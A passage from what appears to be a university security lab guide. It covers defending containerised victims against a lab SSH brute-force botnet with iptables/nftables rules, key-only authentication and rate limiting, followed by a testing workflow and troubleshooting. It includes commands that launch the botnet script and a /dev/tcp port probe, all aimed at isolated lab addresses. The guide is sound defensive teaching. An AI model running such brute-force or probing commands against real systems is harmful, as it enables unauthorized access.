**Key lesson**: Port changes reduce attack surface against automated scanners (which is most of the internet noise). But they provide no protection against a determined attacker. Always combine with strong authentication.

---

### Countermeasure 3 — iptables Firewall Rules

**What it is**: iptables is the Linux kernel's built-in packet filtering framework (the user-space front-end to netfilter). It allows fine-grained control over which traffic is accepted, dropped, or rejected.

**How to apply rules against the lab botnet:**

```bash
# Enter victim1
podman exec -it victim1 bash

# Block the attacker's IP completely
iptables -A INPUT -s 172.21.0.10 -j DROP

# Or: block SSH specifically from attacker
iptables -A INPUT -p tcp --dport 22 -s 172.21.0.10 -j DROP

# Rate-limit new SSH connections (max 3 per minute per IP)
iptables -A INPUT -p tcp --dport 22 \
  -m conntrack --ctstate NEW \
  -m recent --set --name SSH_LIMIT

iptables -A INPUT -p tcp --dport 22 \
  -m conntrack --ctstate NEW \
  -m recent --update --name SSH_LIMIT --seconds 60 --hitcount 4 \
  -j DROP

# Check active rules
iptables -L INPUT -v -n

# Remove a rule (replace -A with -D)
iptables -D INPUT -s 172.21.0.10 -j DROP
```

**Observing the effect**: After adding the DROP rule for the attacker's IP, the botnet's `socket.create_connection()` calls will time out rather than connect. The botnet log shows host sweep finding 0 targets.

**nftables (modern replacement for iptables):**

```bash
# nftables syntax (Kali/Debian default since kernel 5.x)
nft add table inet filter
nft add chain inet filter input { type filter hook input priority 0 \; }

# Rate-limit SSH
nft add rule inet filter input \
  tcp dport 22 ct state new \
  meter ssh_limit { ip saddr limit rate 3/minute } \
  accept

# Block attacker IP
nft add rule inet filter input ip saddr 172.21.0.10 drop

# Show rules
nft list ruleset
```

---

### Countermeasure 4 — Disable Password Authentication

**What it is**: Configure SSH to only accept key-based authentication. Without password auth, a brute-force attack finds nothing to brute-force.

**This is the most effective single countermeasure.**

```bash
podman exec -it victim1 bash

# In sshd_config:
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
echo "PubkeyAuthentication yes"  >> /etc/ssh/sshd_config

kill -HUP $(pgrep sshd)
```

Now the botnet's `paramiko` auth attempts all raise `AuthenticationException` regardless of the password. After exhausting the wordlist, the host is reported as uncompromisable.

**Key lesson**: This is why SSH key auth is the standard on any serious server. The entire brute-force attack class becomes impossible.

---

### Countermeasure Summary

| Defense | Defeats botnet? | Against targeted attacker? | Complexity |
|---|---|---|---|
| fail2ban | Yes (if bantime > attack) | Partial | Low |
| Port change | Yes (mass scanners) | No (full port scan) | Very Low |
| iptables block attacker IP | Yes (after detection) | Reactive, not preventive | Low |
| iptables rate-limit | Slows attack | Slows, doesn't stop | Medium |
| Disable password auth | Yes, completely | Yes, completely | Low |
| All combined | Yes | Yes | Medium |

**The defense-in-depth principle**: No single control is sufficient. Password auth disabled + fail2ban + port change + rate-limiting creates multiple independent barriers. An attacker must defeat all of them to succeed.

---

### Testing Defenses in the Lab

To observe the effect of each defense, run this workflow:

```bash
# 1. Start scenario
./auto_run.sh 2

# 2. Enter victim1 and apply a defense
podman exec -it victim1 bash
# (apply iptables rule, change port, or configure fail2ban here)
exit

# 3. Run the botnet and observe the output
podman exec -it attacker python3 /lab/botnet.py --delay 0.5

# 4. Compare: how many hosts found vs without defense?
# 5. Run detection: did the IDS still fire?
podman exec victim1 cat /var/log/auth.log > /tmp/a.log
podman cp /tmp/a.log monitor:/var/log/lab/auth.log
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
```

---

## 14. Troubleshooting

### Containers Not Starting — "victim-b not found"

```bash
# auto_run.sh already handles --project-directory correctly
./auto_run.sh 2
```

If the error persists, verify you are running `./auto_run.sh` from the project root directory, not from inside `scenarios/`.

### Botnet Finds No SSH Hosts

```bash
# 1. Check attacker can see the network
podman exec attacker ip route

# 2. Check victim SSH is running
podman exec victim1 ps aux | grep sshd

# 3. Try manual TCP connection
podman exec attacker bash -c "echo >/dev/tcp/172.21.0.20/22 && echo OPEN"
```

### Botnet Doesn't Pivot (Only Finds attack_net Hosts)

The new `botnet.py` was not deployed. Rebuild containers:

```bash
./auto_run.sh 2    # always rebuilds all images
```

### GUI Shows Triple Replay (Fixed)

This was a known bug (now fixed). The old code closed the SSE connection when the run finished, which caused the browser to reconnect and replay all events repeatedly. If you still see this, make sure you have the latest `gui.py` and restart the server.

### Detection Shows No Alerts

The analyzer reads from `/var/log/lab/auth.log` inside the monitor container. You must copy the log manually:

```bash
podman exec victim1 cat /var/log/auth.log > /tmp/auth.log
podman cp /tmp/auth.log monitor:/var/log/lab/auth.log
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
```

### "Network discovery failed: Connection reset by peer"

This is a transient SSH timing issue — the SSH daemon on victim1 is busy immediately after the brute-force. Wait a few seconds, or use `--delay 1.0` to slow the botnet down, which gives more time between the brute-force and the follow-up network discovery.

---

*Guide written for FEUP SSR — Systems and Security Resilience*
*Lab: Kali Linux + Podman 5.x · All traffic isolated · Educational use only*
